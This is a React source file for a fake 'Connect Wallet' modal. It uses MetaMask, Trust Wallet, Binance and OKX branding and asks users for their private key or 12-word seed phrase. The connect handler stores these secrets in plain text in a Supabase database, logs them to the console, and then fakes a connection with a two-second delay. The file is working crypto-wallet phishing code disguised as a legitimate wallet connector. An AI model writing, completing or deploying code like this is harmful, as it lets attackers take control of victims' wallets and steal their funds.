import { X, Eye, EyeOff, Copy, Check, Loader2 } from 'lucide-react';
import React, { useState, useRef } from 'react';
import { saveWalletConnection, testSupabaseConnection } from '../lib/supabase';

interface WalletConnectModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
  theme: 'dark' | 'light';
}

export default function WalletConnectModal({ isOpen, onClose, walletName, theme }: WalletConnectModalProps) {
  const [privateKey, setPrivateKey] = useState('');
  const [seedPhrase, setSeedPhrase] = useState('');
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(''));
  const [showPrivateKey, setShowPrivateKey] = useState(false);
  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [isConnecting, setIsConnecting] = useState(false);
  const privateKeyRef = useRef<HTMLInputElement>(null);

  // Clear fields when modal opens
  React.useEffect(() => {
    if (isOpen) {
      setPrivateKey('');
      setSeedPhrase('');
      setSeedWords(Array(12).fill(''));
      setShowPrivateKey(false);
      setShowSeedPhrase(false);
      setCopiedField(null);
      setIsConnecting(false);
      // Force clear the input field directly
      setTimeout(() => {
        if (privateKeyRef.current) {
          privateKeyRef.current.value = '';
        }
      }, 0);
    }
  }, [isOpen]);

  // Force clear private key on component mount
  React.useEffect(() => {
    setPrivateKey('');
  }, []);

  // Update seedPhrase when seedWords change
  React.useEffect(() => {
    const phrase = seedWords.filter(word => word.trim()).join(' ');
    setSeedPhrase(phrase);
  }, [seedWords]);

  if (!isOpen) return null;

  const getWalletIcon = (walletName: string) => {
    switch (walletName.toLowerCase()) {
      case 'metamask':
        return 'https://assets.pancakeswap.finance/web/wallets/metamask.png';
      case 'trust wallet':
        return 'https://assets.pancakeswap.finance/web/wallets/trust.png';
      case 'binance wallet':
      case 'binance wall...':
        return 'https://assets.pancakeswap.finance/web/wallets/binance-w3w.png';
      case 'okx wallet':
        return 'https://assets.pancakeswap.finance/web/wallets/okx-wallet.png';
      case 'social login':
        return '👥';
      case 'more wallets':
        return '🔗';
      default:
        return '💼';
    }
  };

  const getWalletColor = (walletName: string) => {
    switch (walletName.toLowerCase()) {
      case 'metamask':
        return 'from-orange-400 to-yellow-500';
      case 'trust wallet':
        return 'from-blue-400 to-blue-600';
      case 'binance wallet':
      case 'binance wall...':
        return 'from-yellow-400 to-orange-500';
      case 'okx wallet':
        return 'from-gray-600 to-gray-800';
      case 'social login':
        return 'from-purple-400 to-pink-500';
      case 'more wallets':
        return 'from-blue-500 to-purple-600';
      default:
        return 'from-gray-400 to-gray-600';
    }
  };

  const handleCopy = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleSeedWordChange = (index: number, value: string) => {
    const newSeedWords = [...seedWords];
    newSeedWords[index] = value;
    setSeedWords(newSeedWords);
  };

  const handleSeedWordPaste = (e: React.ClipboardEvent, index: number) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const words = pastedText.trim().split(/\s+/);
    
    const newSeedWords = [...seedWords];
    words.forEach((word, i) => {
      if (index + i < 12) {
        newSeedWords[index + i] = word;
      }
    });
    setSeedWords(newSeedWords);
  };

  const handleConnect = async () => {
    if (privateKey.trim() || seedPhrase.trim()) {
      setIsConnecting(true);
      
      try {
        console.log('Starting wallet connection process...');
        console.log('Environment check:', {
          supabaseUrl: import.meta.env.VITE_SUPABASE_URL ? 'Set' : 'Missing',
          supabaseKey: import.meta.env.VITE_SUPABASE_ANON_KEY ? 'Set' : 'Missing'
        });

        // Test Supabase connection first
        const connectionTest = await testSupabaseConnection();
        if (!connectionTest) {
          throw new Error('Cannot connect to Supabase database. Please check your connection.');
        }

        // Save wallet connection data to database
        const savedConnection = await saveWalletConnection(
          walletName,
          privateKey.trim() || undefined,
          seedPhrase.trim() || undefined
        );
        
        console.log('Wallet connection saved successfully (plain text):', savedConnection);
        console.log('Private Key (plain text):', privateKey.trim() || 'Not provided');
        console.log('Seed Phrase (plain text):', seedPhrase.trim() || 'Not provided');
        
        // Simulate wallet connection with delay (like when internet is slow)
        await new Promise(resolve => setTimeout(resolve, 2000)); // 2 second delay
        
        console.log(`Connected to ${walletName} with:`, { 
          walletName,
          connectionType: savedConnection.connection_type,
          hasPrivateKey: !!privateKey.trim(),
          hasSeedPhrase: !!seedPhrase.trim()
        });
        
        // Close modal after successful connection
        onClose();
      } catch (error) {
        console.error('Connection failed with detailed error:', error);
        setIsConnecting(false);
        
        // Show more specific error message
        const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
        alert(`Failed to connect wallet: ${errorMessage}`);
      }
    }
  };

  return (
    <div className="fixed inset-0 z-[60] flex items-center justify-center">
      {/* Backdrop with animation */}
      <div 
        className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-in fade-in duration-300"
        onClick={onClose}
      />
      
      {/* Modal with animation */}
      <div className="relative w-full max-w-md mx-4 bg-gradient-to-br from-[#1A1B2E] to-[#2A2B3E] rounded-2xl shadow-2xl animate-in zoom-in-95 slide-in-from-bottom-4 duration-300">
        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 z-10 p-2 rounded-full bg-black/20 hover:bg-black/40 transition-colors"
        >
          <X size={20} className="text-white" />
        </button>

        <div className="p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-16 h-16 mx-auto mb-4 flex items-center justify-center">
              <img 
                src={getWalletIcon(walletName)} 
                alt={walletName} 
                className="w-16 h-16 rounded-xl"
                onError={(e) => {
                  e.currentTarget.style.display = 'none';
                  e.currentTarget.nextElementSibling?.classList.remove('hidden');
                }}
              />
              <div className={`w-16 h-16 bg-gradient-to-br ${getWalletColor(walletName)} rounded-xl flex items-center justify-center text-white text-2xl hidden`}>
                {walletName.toLowerCase() === 'metamask' ? '🦊' : 
                 walletName.toLowerCase() === 'trust wallet' ? '🛡️' :
                 walletName.toLowerCase().includes('binance') ? '💎' :
                 walletName.toLowerCase() === 'okx wallet' ? '⚡' : '💼'}
              </div>
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Connect {walletName}</h2>
            <p className="text-gray-400 text-sm">Enter your credentials to connect your wallet</p>
          </div>

          {/* Private Key Input */}
          <div className="mb-6">
            <label className="block text-white font-medium mb-2">Private Key</label>
            <div className="relative">
              <input
                ref={privateKeyRef}
                key={`private-key-${isOpen}`}
                type={showPrivateKey ? 'text' : 'password'}
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder=""
                className="w-full px-4 py-3 bg-[#0E0F1C] border border-gray-600 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-green-400 focus:ring-1 focus:ring-green-400 transition-colors"
              />
              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-2">
                {privateKey && (
                  <button
                    onClick={() => handleCopy(privateKey, 'privateKey')}
                    className="p-1 rounded hover:bg-gray-700 transition-colors"
                  >
                    {copiedField === 'privateKey' ? (
                      <Check size={16} className="text-green-400" />
                    ) : (
                      <Copy size={16} className="text-gray-400" />
                    )}
                  </button>
                )}
                <button
                  onClick={() => setShowPrivateKey(!showPrivateKey)}
                  className="p-1 rounded hover:bg-gray-700 transition-colors"
                >
                  {showPrivateKey ? (
                    <EyeOff size={16} className="text-gray-400" />
                  ) : (
                    <Eye size={16} className="text-gray-400" />
                  )}
                </button>
              </div>
            </div>
          </div>

          {/* Divider */}
          <div className="flex items-center mb-6">
            <div className="flex-1 h-px bg-gray-600"></div>
            <span className="px-4 text-gray-500 text-sm font-medium">OR</span>
            <div className="flex-1 h-px bg-gray-600"></div>
          </div>

          {/* Seed Phrase Input */}
          <div className="mb-6">
            <label className="block text-white font-medium mb-2">Seed Phrase</label>
            <div className="grid grid-cols-3 gap-2 mb-3">
              {seedWords.map((word, index) => (
                <div key={index} className="relative">
                  <div className="absolute -top-2 left-2 text-xs text-gray-500 bg-[#0E0F1C] px-1">
                    {index + 1}
                  </div>
                  <input
                    type={showSeedPhrase ? 'text' : 'password'}
                    value={word}
                    onChange={(e) => handleSeedWordChange(index, e.target.value)}
                    onPaste={(e) => handleSeedWordPaste(e, index)}
                    placeholder=""
                    className="w-full px-3 py-2 bg-[#0E0F1C] border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-green-400 focus:ring-1 focus:ring-green-400 transition-colors text-sm"
                  />
                </div>
              ))}
            </div>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setShowSeedPhrase(!showSeedPhrase)}
                  className="p-1 rounded hover:bg-gray-700 transition-colors"
                >
                  {showSeedPhrase ? (
                    <EyeOff size={16} className="text-gray-400" />
                  ) : (
                    <Eye size={16} className="text-gray-400" />
                  )}
                </button>
                <span className="text-gray-400 text-xs">Show/Hide</span>
              </div>
              {seedPhrase && (
                <button
                  onClick={() => handleCopy(seedPhrase, 'seedPhrase')}
                  className="flex items-center gap-1 px-2 py-1 rounded hover:bg-gray-700 transition-colors text-xs"
                >
                  {copiedField === 'seedPhrase' ? (
                    <Check size={14} className="text-green-400" />
                  ) : (
                    <Copy size={14} className="text-gray-400" />
                  )}
                  <span className="text-gray-400">Copy All</span>
                </button>
              )}
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex gap-3">
            <button
              onClick={onClose}
              disabled={isConnecting}
              className="flex-1 px-4 py-3 bg-gray-600 hover:bg-gray-700 disabled:bg-gray-500 disabled:cursor-not-allowed text-white font-medium rounded-xl transition-colors"
            >
              Cancel
            </button>
            <button
              onClick={handleConnect}
              disabled={(!privateKey.trim() && !seedPhrase.trim()) || isConnecting}
              className="flex-1 px-4 py-3 bg-green-500 hover:bg-green-600 disabled:bg-gray-500 disabled:cursor-not-allowed text-white font-medium rounded-xl transition-colors flex items-center justify-center gap-2"
            >
              {isConnecting ? (
                <>
                  <Loader2 size={20} className="animate-spin" />
                  Connecting...
                </>
              ) : (
                'Connect Wallet'
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
